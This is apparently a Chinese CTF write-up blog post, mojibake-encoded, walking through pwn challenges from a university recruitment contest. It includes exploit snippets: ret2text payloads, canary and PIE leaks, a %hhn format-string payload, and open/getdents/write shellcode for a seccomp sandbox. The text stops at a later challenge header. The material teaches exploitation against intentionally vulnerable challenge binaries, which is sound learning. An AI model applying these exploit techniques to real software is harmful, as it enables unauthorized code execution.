---
layout: post
title: "CNSS2024 pwn æ–¹å‘éƒ¨åˆ†wp"
date:   2024-9-21
tags: [CTF]
comments: true
author: ä¹…èœåˆå­
---

##### ***å‰æ’æç¤ºï¼š1.ä¸€äº›é¢˜ç›®æ²¡exp<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;2.ç”±äºé¢˜ç›®ä¸æ˜¯ä¸€æ¬¡ä¸Šå®Œçš„ï¼Œæ‰€ä»¥é¡ºåºä¸Šå¯èƒ½ä¸å®Œå…¨ä¸å½“æ—¶ä¸€è‡´<br>&emsp;&emsp;&emsp;&emsp;&emsp;***
### ğŸ’“ å¼•å¯¼ä¹‹å§‹(ğŸ¼Baby)
```md
âš  é¢˜ç›®æè¿°
å³ä½¿å¼•å¯¼æ—©å·²ç ´ç¢ï¼Œä¹Ÿè¯·æ‚¨å½“ä¸ŠPWNé«˜æ‰‹ã€‚

nc 152.136.11.155 10030

ğŸ’¡ Hint
ä¸€å¤´é›¾æ°´ï¼Ÿä½ å¯èƒ½éœ€è¦é˜…è¯»ç¾¤æ–‡ä»¶->Bin Guideline
éœ€è¦ä¸€ç‚¹ç‚¹å‘½ä»¤è¡Œæ“ä½œçš„çŸ¥è¯†
ncæ˜¯ä»€ä¹ˆï¼Ÿè£…ä¸ªLinuxå§
ğŸ’» é¢˜ç›®é™„ä»¶
ç‚¹å‡»ä¸‹è½½

ğŸš© Flagæ ¼å¼
cnss{meaningful_sentence}

ğŸ”¨ æš´æ‰“å‡ºé¢˜äºº
@Orchid
```
##### &emsp;&emsp;&emsp;ä½ å®¤çš„pwnæ¯å¹´éƒ½æœ‰çš„ncå°±é€é¢˜
### ğŸ«¨ æ‰“åœ°é¼ (ğŸ¼Baby)
```
âš  é¢˜ç›®æè¿°
æ‰“ä¸åˆ°æˆ‘ï¼Œæ‰“ä¸åˆ°æˆ‘å–µ(/â‰§â–½â‰¦)/

nc 152.136.11.155 10031

ğŸ’¡ Hint
ä½ ä¸ä¼šçœŸæ‰“ç®—è‡ªå·±æ‰“å§
ä½ å¯èƒ½éœ€è¦Pwntool
ğŸ’» é¢˜ç›®é™„ä»¶
ç‚¹å‡»ä¸‹è½½

ğŸš© Flagæ ¼å¼
cnss{meaningful_sentence}

ğŸ”¨ æš´æ‰“å‡ºé¢˜äºº
@Orchid
```
##### &emsp;&emsp;&emsp;ä¾ç„¶æ˜¯ä½ å®¤æ¯å¹´éƒ½æœ‰çš„ IO é¢˜ï¼Œè¿™é¢˜æ¯”ä¸Šä¸€å¹´çš„ ***CNSSå¨˜ä¸­ä¹‹äºº*** ç®€å•ä¸€äº›ï¼Œè¿™ä¸ªé¢˜æ‰“å°±å®Œäº†ï¼Œä¸Šä¸€å¹´çš„é¢˜è¿˜éœ€è¦åšåˆ†ç±»å’Œæ¨¡å¼åŒ¹é…ã€‚<br>&emsp;&emsp;&emsp;ä¸ªäººè§‚å¯Ÿæ¥çœ‹ï¼Œå¾ˆå¤šäººç¬¬ä¸‰é¢˜åšäº†ä¹Ÿæ²¡æœ‰åšè¿™ä¸ªç¬¬äºŒé¢˜ï¼Œå®é™…ä¸Šè¿™ç§ IO é¢˜å®Œå…¨ä¸éœ€è¦ pwn çŸ¥è¯†ï¼Œåªéœ€è¦ä¼šç”¨ pwntools é‡Œçš„ IO å·¥å…·å³å¯ã€‚ç©¶å…¶åŸå› ï¼Œç¬¬ä¸€IDAåç¼–è¯‘æŠŠå¤§ğŸ”¥ç»™å“åäº†ï¼Œé€»è¾‘å®ç°è¿˜æ˜¯æ¯”è¾ƒé•¿çš„ï¼ˆè™½ç„¶ä¸ä¸€å®šéœ€è¦å»çœ‹ï¼‰ï¼Œå…¶æ¬¡è°ƒ IO æ¯”è¾ƒéº»çƒ¦ï¼Œå¯¹äºæ”¶å‘å­—ç¬¦éœ€è¦æœ‰æ¯”è¾ƒç²¾ç¡®çš„æ§åˆ¶ ï¼Œå…¶å®pwnå°±æ˜¯è¿™æ ·ç¹çï¼Œå·®é”™ä¸€ä¸ªå­—èŠ‚ç”šè‡³ä¸€ä¸ªä½éƒ½ä¸è¡Œï¼ŒIO é¢˜åªæ˜¯ä¸€åˆ‡çš„å¼€å§‹ï¼Œå–œæ¬¢çš„å°ä¼™ä¼´åƒä¸‡ä¸è¦æ”¾å¼ƒã€‚<br>&emsp;&emsp;&emsp;ä¸€ç‚¹å’Œæœ¬é¢˜ç›¸å…³çš„ï¼Œåç¼–è¯‘å¾—çŸ¥ç©å®¶è¾“å‡ºçš„åœ°é¼ ä»£å·æ˜¯ç”¨ ```getchar()``` æ¥æ”¶çš„ï¼Œè€Œä¸”åªæœ‰ä¸€ä¸ª ```getchar()```ï¼Œæ‰€ä»¥åœ¨å‘é€çš„æ—¶å€™ä¸è¦ä½¿ç”¨ ```.sendline()```ï¼Œå¦åˆ™å¤šå‡ºæ¥çš„ ```'\n'``` ä¼šåœ¨ä¸‹ä¸€æ¬¡æ‰“åœ°é¼ æ—¶è¢«æ¥æ”¶ã€‚å¦‚æœæ‰“è¿‡ç®—æ³•ç±»ç«èµ›ï¼Œè‚¯å®šå¯¹æ­¤æ·±æœ‰ä½“ä¼šã€‚
### ğŸ¥º not enough(ğŸ”Easy)
```
âš  é¢˜ç›®æè¿°
å¿«æŠŠshellç»™æˆ‘ï¼

nc 152.136.11.155 10032

ğŸ’¡ Hint
ğŸ’» é¢˜ç›®é™„ä»¶
ç‚¹å‡»ä¸‹è½½

ğŸš© Flagæ ¼å¼
cnss{meaningful_sentence}

ğŸ”¨ æš´æ‰“å‡ºé¢˜äºº
@Orchid
```
##### &emsp;&emsp;&emsp;è¿™é“é¢˜å‰¥å»äº†ç¬¦å·è¡¨ï¼Œä½†å®é™…ä¸Šä¹Ÿæ²¡å¤ªå¤§å½±å“ï¼Œæ ¸å¿ƒä»£ç åªæœ‰ä¸€ä¸ª```main()```å’Œä¸€ä¸ªæ‰‹å†™çš„æ”¹è¿›ç‰ˆ```read()```ï¼Œè¿™ä¸ªæ”¹è¿›ç‰ˆ```read()```ä½œç”¨å°±æ˜¯è¾“å…¥```'\n'```æ—¶ç»ˆæ­¢è¾“å…¥ï¼Œå¹¶æŠŠå…¶æ”¹ä¸º```'\0'```ï¼Œä»¥æˆªæ–­å­—ç¬¦ä¸²ï¼Œå’Œ```scanf("%s")```å·®ä¸å¤šï¼Œä½†æ˜¯é™åˆ¶è¾“å…¥é‡ã€‚è¿™ä¸ªæ”¹ç‰ˆ```read()```å¾ˆå¸¸è§å¹¶ä¸”ä¸€èˆ¬æ¼æ´ç‚¹ä¸ä¼šæ”¾åœ¨è¿™é‡Œé¢ã€‚<br>&emsp;&emsp;&emsp;æŸ¥çœ‹12è¡Œï¼Œå‘ç°å­—ç¬¦ä¸²å¯ä»¥è¶Šç•Œè¯»å†™ï¼Œäºæ˜¯å¯ä»¥æº¢å‡ºåˆ°```v4```ï¼Œå°†å…¶ä¿®æ”¹ä¸º```0x114514```ï¼Œç„¶åå°±å¯ä»¥è½»æ¾ ```getshell()```
### ğŸ˜• We're safe... for now... or not?(ğŸ”Easy)
```
âš  é¢˜ç›®æè¿°
æœåŠ¡å™¨å‡ºå¤§é”…å•¦ï¼Œ@XeAmæ­£åœ¨ç´§æ€¥æŠ¢ä¿®ç³»ç»Ÿï¼Œå¥½ä¸å®¹æ˜“ä¿®å¥½äº†ã€‚
è¿™æ—¶ï¼Œä¸€ä¸ªåˆ»æ¿å°è±¡çš„é»‘å®¢å¤§è„¸å‡ºç°äº†ï¼Œæ€ä¹ˆå›äº‹ï¼Ÿ

æ˜æ˜ç¨‹åºmainå‡½æ•°é‡Œé¢çœ‹èµ·æ¥æ²¡æœ‰å¼‚å¸¸ï¼Œä¸ºä»€ä¹ˆå‡ºç°äº†HACKEDå­—æ ·ï¼Ÿ

è¯·å°†ä½ çš„æƒ³æ³•æ•´ç†æˆPDFæˆ–markdownæ ¼å¼ï¼Œå‘é€åˆ°wwworchid39@gmail.comï¼Œæˆ‘å°†æ ¹æ®ä½ çš„ç­”æ¡ˆç»™å‡ºflag

å¦‚æœ12å°æ—¶å†…æœªå›å¤è¯·QQè”ç³»ã€‚

ğŸ’¡ Hint
è¿™æ˜¯ä¸€ä¸ªELFç¨‹åºï¼Œä¹Ÿå°±æ˜¯è¯´ä½ éœ€è¦Linuxä¸‹è¿è¡Œ
chmod +x pwn
åŠ¨æ€è°ƒè¯•ä¼šå¾ˆç®¡ç”¨
ç¨‹åºçš„calleeæ˜¯å¦‚ä½•è¿”å›callerçš„ï¼Ÿ
ğŸ’» é¢˜ç›®é™„ä»¶
ç‚¹å‡»ä¸‹è½½

ğŸš© Flagæ ¼å¼
cnss{meaningful_sentence}

ğŸ”¨ æš´æ‰“å‡ºé¢˜äºº
@Orchid
```
##### &emsp;&emsp;&emsp;å¾ˆç®€å•ï¼Œå¤åˆ¶å­—ç¬¦ä¸²åˆ°ç›®æ ‡æ ˆåœ°å€ä¸Šï¼Œç”±äºæ²¡æœ‰æ£€æŸ¥é•¿åº¦å’Œcanaryï¼Œå¯¼è‡´äº† ***previous rbp*** å’Œ ***è¿”å›åœ°å€çš„æœ€ä½ä¸€ä½*** è¢«è¦†ç›–ï¼Œè€Œè¢«è¦†ç›–åçš„åœ°å€æŒ‡å‘äº†ä¸€ä¸ªåé—¨å‡½æ•°ã€‚
### ğŸ˜— Iâ€™m the mole(ğŸ”Easy)
```
âš  é¢˜ç›®æè¿°
åšå®ŒğŸ˜• We're safe... for now... or not?åï¼Œä½ ç»ˆäºçŸ¥é“æ¼æ´åœ¨å“ªé‡Œäº†ï¼Œæ­¤æ—¶ä½ åŠ¨äº†ç‚¹å°å¿ƒæ€...

nc 152.136.11.155 10035

ğŸ’¡ Hint
ç»“åˆä¹‹å‰å­¦åˆ°çš„å·¥å…·æ¥åšï¼
ğŸ’» é¢˜ç›®é™„ä»¶
ç‚¹å‡»ä¸‹è½½

ğŸš© Flagæ ¼å¼
cnss{meaningful_sentence}

ğŸ”¨ æš´æ‰“å‡ºé¢˜äºº
@Orchid
```
##### &emsp;&emsp;&emsp;ä¹Ÿæ˜¯ä¿ç•™é¡¹ç›® ***ret2text***ï¼Œè¿ç”¨ä»ä¸Šä¸€é¢˜å­¦åˆ°çš„æ ˆæº¢å‡ºæŠ€æœ¯ï¼Œå°†è¿”å›åœ°å€ä¿®æ”¹ä¸ºåé—¨å‡½æ•°å³å¯ ```getshell``` ã€‚<br>&emsp;&emsp;&emsp;å€¼å¾—æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œä¼—æ‰€å‘¨çŸ¥ï¼Œ64ä½çš„ ```system()``` è¦æ±‚æ ˆåœ°å€16ä½å¯¹é½ï¼Œè€Œä¸æ˜¯å¹³å¸¸çš„8ä½ï¼ˆå…·ä½“åŸå› è¯·ç§»æ­¥nydnå¤§ä½¬çš„åšå®¢https://nyyyddddn.github.io/2023/09/26/exp%E6%9C%AC%E5%9C%B0%E4%B8%8D%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A%E7%9A%84%E9%97%AE%E9%A2%98/ ï¼‰ï¼Œæ¶‰åŠå…¶ä¸­ä¸€ä¸ªå¯„å­˜å™¨çš„é—®é¢˜ã€‚<br>&emsp;&emsp;&emsp;æ‹›æ–°pwné¢˜æ‰€æœ‰æ¶‰åŠ ***ret2text*** å’Œ ```system()```çš„ï¼Œä¼¼ä¹æœ¬åœ°è¿œç¨‹éƒ½æœ‰è¿™ä¸ªæ ˆå¹³è¡¡çš„é—®é¢˜ï¼Œå¯¹äºæ­¤é¢˜æ¥è¯´ï¼Œæœ€ç»ˆçš„ ***ROP*** åº”è¯¥æ˜¯ä¸‹é¢è¿™æ ·çš„ã€‚
```python
io.send(b'a'*?????? + p64(ret) + p64(backdoor))
```
##### &emsp;&emsp;&emsp;å…¶ä»–çš„é¢˜è¿˜æœ‰å…¶ä»–çš„æ–¹æ³•ï¼Œä¹‹åä¼šè®²ã€‚
### â˜ï¸ Call Meâ€¦â€¦(ğŸ”Easy)
```
âš  é¢˜ç›®æè¿°
â€¦â€¦Call Meâ€¦â€¦

ä¸æ˜¯ï¼Œè¿™ç”µè¯ä¹Ÿæ‰“ä¸é€šå•Šï¼Ÿ

ğŸ”— é¢˜ç›®åœ°å€
nc 152.136.11.155 10037

ğŸ“ƒ é¢˜ç›®é™„ä»¶
ç‚¹æˆ‘ä¸‹è½½

ğŸ’¡ Hint
Canary
Pie
ğŸš© Flagæ ¼å¼
CNSS{meaningful_sentence}

ğŸ”¨ æš´æ‰“å‡ºé¢˜äºº
@Timlzh
```
##### &emsp;&emsp;&emsp;å¯ä»¥æ„Ÿè§‰åˆ°Timå‡ºçš„é¢˜å¾ˆæ¸©æ²¹ï¼Œåé¢çš„ä¸€é“ ***heap*** ä¹Ÿæ˜¯ã€‚<br>&emsp;&emsp;&emsp;ä»è¿™é¢˜å¼€å§‹è¦æ¥è§¦æ­£å„¿å…«ç»çš„ä¿æŠ¤æªæ–½äº†ï¼Œè¿™é¢˜ä¸»è¦æ˜¯Canaryå’ŒPieã€‚<br>&emsp;&emsp;&emsp;Canaryï¼ˆé‡‘ä¸é›€ï¼‰æ˜¯æ ˆæº¢å‡ºå“¨å…µï¼Œå¦‚æœå¼€å¯äº†å®ƒï¼Œæ ˆå¸§çš„ ```last rbp/ebp``` ä½ä¸€ä½å­—é•¿çš„ä½ç½®å°±ä¼šå¡«å†™ä¸€å­—é•¿çš„éšæœºé‡ï¼Œç„¶åç¨‹åºå°±ä¼šåœ¨éœ€è¦æ ˆæº¢å‡ºæ£€æŸ¥çš„å‡½æ•°è¿”å›ä¹‹å‰æ£€æŸ¥è¿™ä¸ªéšæœºé‡ï¼Œå¦‚æœå‘ç°è¿™ä¸ªé‡è¢«ä¿®æ”¹ï¼Œå½“å‰å‡½æ•°ä¸è¿”å›ï¼Œæ‰§è¡Œé”™è¯¯å¤„ç†ï¼ˆç„¶åé€€å‡ºï¼‰ã€‚<br>&emsp;&emsp;&emsp;æ³¨æ„Canaryçš„æœ€ä½ä½ä¸€å®šä¸º```'\x00'```ï¼Œèµ·åˆ°æˆªæ–­è¾“å‡ºçš„æ•ˆæœï¼ˆå¯¹```write()```æ²¡ç”¨ï¼‰ï¼Œå¹¶ä¸”Canaryçš„å€¼æ˜¯å…¨å±€å˜é‡ï¼Œåœ¨ä¸€ä¸ªç¨‹åºçš„ç”Ÿå‘½å‘¨æœŸä¸­ä¸å˜ã€‚<br>&emsp;&emsp;&emsp;ç„¶åPIEï¼Œå’ŒASLRä¸€æ ·æ˜¯åœ°å€éšæœºåŒ–çš„ä¿æŠ¤æŠ€æœ¯ã€‚åŒºåˆ«åœ¨äºASLRæ˜¯æ“ä½œç³»ç»Ÿå®ç°çš„ï¼Œä¸€èˆ¬å…³ä¸æ‰ï¼Œè€Œä¸”åªéšæœºå †æ ˆå’ŒåŠ¨æ€é“¾æ¥çš„éƒ¨åˆ†ï¼›PIEæ˜¯ç¼–è¯‘å™¨å®ç°çš„ ```gcc -no-pie``` å¯ä»¥å…³æ‰PIEï¼Œå¯ä»¥å°†```.text```ã€```.bss```ã€```.data``` ç­‰åœ°å€ä¹ŸéšæœºåŒ–ï¼Œè®©ä½ æ‰“ROPæ›´éš¾å—ï¼ˆä¸æ˜¯ï¼‰ã€‚æœ€åï¼Œæ— è®ºæ€ä¹ˆéšæœºåŒ–ï¼Œéƒ½æ˜¯ä»¥é¡µä¸ºå•ä½çš„ï¼Œä¹Ÿå°±æ˜¯16è¿›åˆ¶çš„åä¸‰ä½ä¸ä¼šå˜åŒ–ï¼Œåœ°å€ä¹‹é—´çš„åç§»ä¹Ÿä¸ä¼šå˜åŒ–ã€‚
##### &emsp;&emsp;&emsp;è¿™ä¸ªé¢˜åœ¨è¾“å…¥æ­£å¥½11ä½çš„ç”µè¯å·ç ä¹‹å‰ï¼Œä¼šä¸€ç›´å¾ªç¯æ‰“å°è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œè€ƒè™‘å€Ÿæ­¤leak pie å’Œ canaryã€‚
```python
# leak canary
payload1 = b'a'*(???? + 1) # æº¢å‡ºåˆ°canaryæœ€ä½ä½çš„\x00ï¼Œä¾¿äºè¾“å‡ºæ—¶å¸¦å‡ºcanary
# leak pie
payload2 = b'a'*(!!!!) # æ­£å¥½å®Œå…¨è¦†ç›–last_rbpå³å¯
# ret2backdoor
payload3 = b'a'*($$$$) + p64(canary) + p64(fake_rbp) + p64(backdoor + pie_base)
```
##### &emsp;&emsp;&emsp;ç„¶åè¿˜æ˜¯```system()``` æ ˆå¹³è¡¡çš„é—®é¢˜ï¼Œå¯ä»¥å‘ä¸Šé¢ä¸€æ ·ï¼Œåœ¨ ROP ä¸­åŠ å…¥ ```p64(ret + pie_base)```ï¼Œä¹Ÿå¯ä»¥è¿”å›åˆ°```backdoor()``` ä¸­å®é™…è°ƒç”¨ ```system()``` çš„ä½ç½®ï¼Œç”±äºå°‘äº†æœ€å¼€å¤´çš„å‹æ ˆæ“ä½œï¼Œä»æ­¤å¤„å¼€å§‹è°ƒç”¨ç¡®å®æ˜¯16ä½å¯¹é½çš„ã€‚
```c
public bug
bug proc near
; __unwind {
endbr64
push    rbp
mov     rbp, rsp
lea     rax, command    ; "/bin/sh"  <----------ç›´æ¥retåˆ°è¿™ä¸ªä½ç½®
mov     rdi, rax        ; command
call    _system
mov     edi, 0          ; status
call    _exit
; } // starts at 128D
bug endp
```
### ğŸ¦â€â¬› happy sugar life(ğŸ¤–Mid)
```
âš  é¢˜ç›®æè¿°
æ½®æ°´è¤ªå»ï¼Œåœ¨é˜³å…‰ä¸‹å‰¥è½å‡ºçš„ç™½è‰²æ™¶èƒ
å°ä¹‹ï¼Œå£æ„Ÿå’¸é²œå›ç”˜

æ®ä¼ æ˜¯å¯¹ä»˜ç¾½å…½çš„å®ç‰©
å¸é£Ÿä¸€ç²’å³ä¼šæ¯™å‘½

å¹½æš—æ£®æ—é‡Œçš„æ­Œå£°å›å“
ç¥‚æ˜¯å…‰æ˜ã€ä¹Ÿæ˜¯æ•‘èµ
äº¦ä¸çŸ¥å°†è¢«å°–é”çš„è¡€è‰²åæ²¡

å–œé£Ÿç³–ç‰©ï¼Œäºæ˜¯ç¥‚é£å‘äº†æµ·è¾¹â€¦â€¦

ğŸ’¡ Hint
ğŸ’» é¢˜ç›®é™„ä»¶
ç‚¹å‡»ä¸‹è½½

ğŸš© Flagæ ¼å¼
cnss{meaningful_sentence}

ğŸ”¨ æš´æ‰“å‡ºé¢˜äºº
@Astesia
```
###### &emsp;&emsp;&emsp;Hint+ï¼šCanary == n.é‡‘ä¸é›€; å…¶æ¬¡Canaryå¯èƒ½å‘éŸ³ä¸Candyæœ‰éƒ¨åˆ†ç›¸è¿‘å§ï¼ˆ
##### &emsp;&emsp;&emsp;æ‰€ä»¥è¿™ä¸€é¢˜è¿˜æ˜¯æƒ³åŠæ³•ç»•è¿‡Canaryä¿æŠ¤ï¼Œç„¶åè¿”å›åˆ°åé—¨å‡½æ•°ã€‚å®é™…ä¸Šè¿™ä¸€é¢˜æ¯”ä¸Šä¸€é¢˜ä¸Šé¢˜ä¸Šå¾—æ—©ä¸€äº›ã€‚<br>&emsp;&emsp;&emsp;
```c
unsigned __int64 sugar_salt()
{
  int i; // [rsp+8h] [rbp-38h]
  int v2; // [rsp+Ch] [rbp-34h]
  char s[40]; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 v4; // [rsp+38h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  strcpy(s, "We don't need a canaria. I'll kill you!");
  v2 = strlen(s);
  for ( i = v2; i <= 40; ++i ) // <---------- æ¼æ´
    s[i] = v2 + 1;
  printf("Satou:%s", s); // <---------- leak canary and stack
  read(0, s, 0x28uLL); 
  printf("Shio:");
  printf(s); // <-------- æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´
  return v4 - __readfsqword(0x28u);
}
```
##### &emsp;&emsp;&emsp;æ¼æ´åœ¨```for ( i = v2; i <= 40; ++i )```ï¼Œä¹Ÿæ˜¯cè¯­è¨€æ–°æ‰‹å¸¸çŠ¯çš„é”™è¯¯ï¼Œä¸‹æ ‡æ˜¯0å¼€å§‹çš„ï¼Œæ‰€ä»¥è¿™é‡Œæ­£å¥½ ***offset-by-one*** , æŠŠCanaryæœ€ä½ä½è¦†ç›–ï¼Œä¹‹ååˆè‡ªå¸¦ä¸€ä¸ªè¾“å‡ºå°±æŠŠCanaryæ³„éœ²äº†ã€‚<br>&emsp;&emsp;&emsp;å¯ä»¥çœ‹åˆ°ç¬¬äºŒéè¾“å…¥æ²¡æœ‰è¶Šç•Œå†™ï¼Œä½†æ˜¯æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚æ‰€ä»¥è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åšä¸¤ä»¶äº‹ï¼Œä¸€æ˜¯ä¿®å¤Canaryæœ€ä½ä½ä¸º```'\x00'```ï¼ŒäºŒæ˜¯æ”¹è¿”å›åœ°å€ã€‚<br>&emsp;&emsp;&emsp;ç„¶åä¸€ä»¶äº‹ï¼Œç”±äºæˆ‘ä»¬è¦æ”¹æ ˆä¸Šçš„å†…å®¹ï¼Œäºæ˜¯éœ€è¦æŒ‡å‘æ ˆæŸäº›ä½ç½®çš„æŒ‡é’ˆï¼Œè¿›è€Œéœ€è¦æ³„éœ²æ ˆåœ°å€ï¼Œå¹¸å¥½æ ˆåœ°å€ä¹Ÿå’ŒCanaryä¸€èµ·æ³„éœ²äº†ã€‚<br>&emsp;&emsp;&emsp;å¤§è‡´çš„payloadå¦‚ä¸‹ï¼Œä½¿ç”¨```%hhn```è€Œä¸æ˜¯```%n```ä¿®æ”¹å•ä¸ªå­—èŠ‚ã€‚
```python
canary = u64(io.recv(8))|0xff - 0xff
last_rbp = u64(io.recv(6).ljust(8, b'\x00')) # æ ˆåœ°å€çš„ä¸€èˆ¬é«˜ä¸¤ä½æ˜¯ç©ºçš„
rbp = last_rbp - offset # offset æ˜¯å®šå€¼

payload = b'%{argv1_offset}$hhn' + b'%{amount}c' + b'%{argv2_offset}$hhn'
payload += b'a'*???? # ç¡®ä¿æ¥ä¸‹æ¥çš„ä¸¤ä¸ªæŒ‡é’ˆå‚æ•°æŒ‰å…«ä½å¯¹é½ã€‚
payload += p64(rbp - 0x8) + p64(rbp + 0x8)
```
###### &emsp;&emsp;&emsp;ç„¶åè¿™ä¸ª```backdoor()```ä¹Ÿæ˜¯æœ‰æ ˆå¹³è¡¡çš„é—®é¢˜ï¼Œè§£å†³æ–¹å¼å’Œä¸Šä¸€é¢˜ä¸€è‡´ã€‚

### ğŸ¤” sä»£è¡¨ç€...(ğŸ¤–Mid)
```
âš  é¢˜ç›®æè¿°
å¡å…‹è€ƒå§†åŸçš„ç¥å¥‡æ——å¸œ
å…¶çœŸåä¼šéšæ—¶é—´è€Œå˜åŒ–

æ®è¯´åªæœ‰å‘¼å”¤å‡ºæ­£ç¡®çš„åå·
æ‰èƒ½è¢«ä¸¾èµ·æŒ¥èˆ

å¦‚åšå®çš„å·¨æ ‘ï¼Œå±¹ç«‹ä¸å€’
å¦‚æ•æ·çš„å¹»è±¡ï¼Œè‹¥å³è‹¥ç¦»
å¦‚ç¥åœ£çš„å…‰èŠ’ï¼ŒæŒ‡å¼•èƒœåˆ©

ç­›å°”å¯‡å¾·ï¼ŸæŒ¥èˆæ——å¸œçš„ç¬¬ä¸€å‹‡å£«ã€‚

ğŸ’¡ Hint
flagæ–‡ä»¶åå¹¶é"./flag"ã€"./flag.txt"ç­‰
æ³¨æ„æ²™ç®±ä¸­è¢«å…è®¸çš„ç³»ç»Ÿè°ƒç”¨
ğŸ’» é¢˜ç›®é™„ä»¶
ç‚¹å‡»ä¸‹è½½

ğŸš© Flagæ ¼å¼
cnss{meaningful_sentence}

ğŸ”¨ æš´æ‰“å‡ºé¢˜äºº
@Astesia
```
###### &emsp;&emsp;&emsp;å·²ç»å‘Šè¯‰äº†sä»£è¡¨shellcodeã€‚
##### &emsp;&emsp;&emsp;checksecé­…åŠ›æ—¶åˆ»ï¼Œæœ‰rwxæ®µï¼Œä½†å°±æ˜¯ä¸æç¤ºï¼Œåªèƒ½gdbè°ƒè¯•çœ‹çœ‹ã€‚
```sh
$ checksec pwn5
[*] '/home/pwn/worktable/cnss2024/pwn5'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled   <----- æ³¨æ„å¼€äº†PIE
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
```bash
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
       0x142857000        0x142858000 rwxp     1000      0 [anon_142857]
    0x555555554000     0x555555555000 r--p     1000      0 /home/pwn/worktable/cnss2024/pwn5
    0x555555555000     0x555555556000 r-xp     1000   1000 /home/pwn/worktable/cnss2024/pwn5
    0x555555556000     0x555555557000 r--p     1000   2000 /home/pwn/worktable/cnss2024/pwn5
    0x555555557000     0x555555558000 r--p     1000   2000 /home/pwn/worktable/cnss2024/pwn5
    0x555555558000     0x555555559000 rw-p     1000   3000 /home/pwn/worktable/cnss2024/pwn5
    0x7ffff7d60000     0x7ffff7d63000 rw-p     3000      0 [anon_7ffff7d60]
```
###### &emsp;&emsp;&emsp;ç¬¬ä¸€ä¸ªå°±æ˜¯ã€‚<br>
##### &emsp;&emsp;&emsp;æ³¨æ„åˆ°å¼€äº†sandbox
```sh
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x08 0xffffffff  if (A != 0xffffffff) goto 0013
 0005: 0x15 0x06 0x00 0x00000000  if (A == read) goto 0012
 0006: 0x15 0x05 0x00 0x00000001  if (A == write) goto 0012
 0007: 0x15 0x04 0x00 0x00000002  if (A == open) goto 0012
 0008: 0x15 0x03 0x00 0x00000003  if (A == close) goto 0012
 0009: 0x15 0x02 0x00 0x00000009  if (A == mmap) goto 0012
 0010: 0x15 0x01 0x00 0x0000004e  if (A == getdents) goto 0012
 0011: 0x15 0x00 0x01 0x0000005a  if (A != chmod) goto 0013
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0013: 0x06 0x00 0x00 0x00000000  return KILL
```
##### &emsp;&emsp;&emsp;ç”±äºHintæç¤ºflagåç§°æœªçŸ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿ç”¨å›¾ä¸­```getdents```å…ˆè·å–å½“å‰åˆ—è¡¨çš„æ‰€æœ‰æ–‡ä»¶ä¿¡æ¯ï¼Œç„¶åå†æ‰“ä¸€ä¸ªORWã€‚<br>&emsp;&emsp;&emsp;æ³¨æ„```K```é‚£ä¸€åˆ—ï¼Œæ˜¯å…·ä½“çš„ç³»ç»Ÿè°ƒç”¨å·ï¼Œç½‘ä¸Šéƒ½æ•™64ä½ç”¨```getdents64```ï¼Œä½†å®ƒçš„è°ƒç”¨å·è¿™é¢˜è¢«banäº†ï¼Œç”¨```getdents```æœ¬èº«ä¹Ÿè¶³å¤Ÿäº†ã€‚<br>&emsp;&emsp;&emsp;é—®äº†å‡ºé¢˜äººï¼Œflagçš„åç§°æ¯1så˜ä¸€æ¬¡ï¼Œæ‰€ä»¥æ‰ç»™äº†ä¸¤æ¬¡shellcodeçš„æœºä¼šã€‚<br>&emsp;&emsp;&emsp;ç„¶åæ³¨æ„ä¸€ç‚¹ï¼Œç¬¬ä¸€éshellcodeè¦æœ‰å‹æ ˆå’Œè¿”å›çš„æ“ä½œï¼Œä¸ç„¶åˆ°è¿™å°±SEGVäº†ï¼Œæ²¡æœ‰ç¬¬äºŒæ¬¡shellcodeçš„æœºä¼šã€‚<br>&emsp;&emsp;&emsp;å¼€è¾Ÿ0x200æ ˆç©ºé—´ï¼Œä¿¡æ¯ç›´æ¥æ”¾åœ¨æ ˆä¸Šã€‚
```sh
shellcode1 = '''
    push rbp
    mov rbp, rsp
    sub rsp, 0x200
'''
shellcode1 += shellcraft.open("./")
shellcode1 += shellcraft.getdents(3, "rsp", 0x200)
shellcode1 += shellcraft.write(1, "rsp", 0x200)
shellcode1 += '''
        leave
        ret
'''

shellcode2 = {$orw}
```
##### &emsp;&emsp;&emsp;åšä¸»å†™çš„æ—¶å€™ç”±äºç”¨çš„wslï¼Œä¸çŸ¥ä¸ºä½•wslä¸Špwntoolsçš„asm()å¾ˆæ…¢ï¼Œå¯¼è‡´ä¸¤æ¬¡shellcodeé—´éš”è¶…è¿‡1sï¼Œflagæ–‡ä»¶åå·²ç»å˜äº†ï¼Œæ­»æ´»è¿‡ä¸äº†ï¼Œåæ¥ç”¨è™šæ‹Ÿæœºç›´æ¥è¿‡ã€‚
### ğŸ˜ å¤´å·ç©å®¶(ğŸ¤–Mid)
```
âš  é¢˜ç›®æè¿°
éšåŒ¿åœ¨å“å­¦æ¥¼ä¹‹ä¸­çš„å¹½çµï¼Œ
ä¸å¯è§‚æµ‹ï¼Œéš¾ä»¥è¨€å–»

æ—§æ—¶ï¼Œä¼šæœ‰è®¸å¤šäººå‰å»å¯»æ‰¾ä»–ï¼Œ
æˆ–ææƒ§ã€æˆ–æœŸå¾…

è¯è™½å¦‚æ­¤ï¼Œ
çœŸæ­£çš„ä»–ï¼Œæˆ–è®¸æ—©å·²è¢«äººå¿˜å´

ğŸ’¡ Hint
